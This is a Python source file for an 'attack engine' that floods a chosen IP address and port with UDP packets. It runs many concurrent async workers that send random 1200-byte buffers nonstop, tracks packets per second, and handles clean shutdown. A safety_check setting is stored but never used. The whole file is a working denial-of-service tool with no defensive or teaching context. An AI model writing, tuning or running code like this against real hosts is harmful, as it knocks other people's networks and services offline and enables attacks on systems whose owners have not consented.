"""Fixed attack engine — no crash on stop, clean worker management."""

from __future__ import annotations

import asyncio
import logging
import os
import socket
import time
from dataclasses import dataclass, field
from typing import List

LOGGER = logging.getLogger(__name__)


@dataclass
class AttackStats:
    sent_packets: int = 0
    failed_packets: int = 0
    bytes_sent: int = 0
    started_at: float = 0.0
    running: bool = False

    @property
    def elapsed(self) -> float:
        if not self.running or self.started_at == 0:
            return 0.001
        return max(0.001, time.time() - self.started_at)

    @property
    def rps(self) -> float:
        return self.sent_packets / self.elapsed


class BufferPool:
    def __init__(self, size: int = 1200, count: int = 512) -> None:
        self._buffers = [os.urandom(size) for _ in range(count)]
        self._idx = 0

    def next(self) -> bytes:
        buf = self._buffers[self._idx]
        self._idx = (self._idx + 1) % len(self._buffers)
        return buf


class AttackEngine:
    def __init__(self, max_threads: int, max_duration: int, safety_check: bool = True) -> None:
        self.max_threads = max_threads
        self.max_duration = max_duration
        self.safety_check = safety_check
        self.stats = AttackStats()
        self._stop_event: asyncio.Event = asyncio.Event()
        self._workers: List[asyncio.Task] = []
        self._buffer_pool = BufferPool()
        self._lock = asyncio.Lock()

    def stop(self) -> None:
        self._stop_event.set()
        for task in self._workers:
            if not task.done():
                task.cancel()

    async def run_udp_test(self, ip: str, port: int, duration: int) -> AttackStats:
        async with self._lock:
            # Clean previous workers
            if self._workers:
                self.stop()
                await asyncio.gather(*self._workers, return_exceptions=True)
                self._workers.clear()

            run_seconds = min(duration, self.max_duration)
            self.stats = AttackStats(started_at=time.time(), running=True)
            self._stop_event = asyncio.Event()

            LOGGER.info("UDP attack: %s:%s for %ss x %s workers", ip, port, run_seconds, self.max_threads)

            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.setblocking(False)
            except OSError as exc:
                self.stats.running = False
                raise RuntimeError(f"Socket create fail: {exc}") from exc

            for i in range(self.max_threads):
                task = asyncio.create_task(
                    self._udp_worker(sock, ip, port),
                    name=f"worker_{i}"
                )
                self._workers.append(task)

            try:
                await asyncio.wait_for(
                    self._stop_event.wait(),
                    timeout=run_seconds
                )
            except asyncio.TimeoutError:
                pass
            finally:
                self._stop_event.set()

                for task in self._workers:
                    if not task.done():
                        task.cancel()

                await asyncio.gather(*self._workers, return_exceptions=True)
                self._workers.clear()

                try:
                    sock.close()
                except Exception:
                    pass

                self.stats.running = False
                LOGGER.info(
                    "Attack done — sent: %s, fail: %s",
                    self.stats.sent_packets, self.stats.failed_packets
                )

        return self.stats

    async def _udp_worker(self, sock: socket.socket, ip: str, port: int) -> None:
        loop = asyncio.get_running_loop()
        while not self._stop_event.is_set():
            payload = self._buffer_pool.next()
            try:
                await loop.sock_sendto(sock, payload, (ip, port))
                self.stats.sent_packets += 1
                self.stats.bytes_sent += len(payload)
            except BlockingIOError:
                await asyncio.sleep(0)
            except OSError as e:
                self.stats.failed_packets += 1
                if self.stats.failed_packets % 500 == 0:
                    LOGGER.debug("Send error: %s", e)
                await asyncio.sleep(0.001)
            except asyncio.CancelledError:
                break
            except Exception as e:
                self.stats.failed_packets += 1
                LOGGER.debug("Worker error: %s", e)
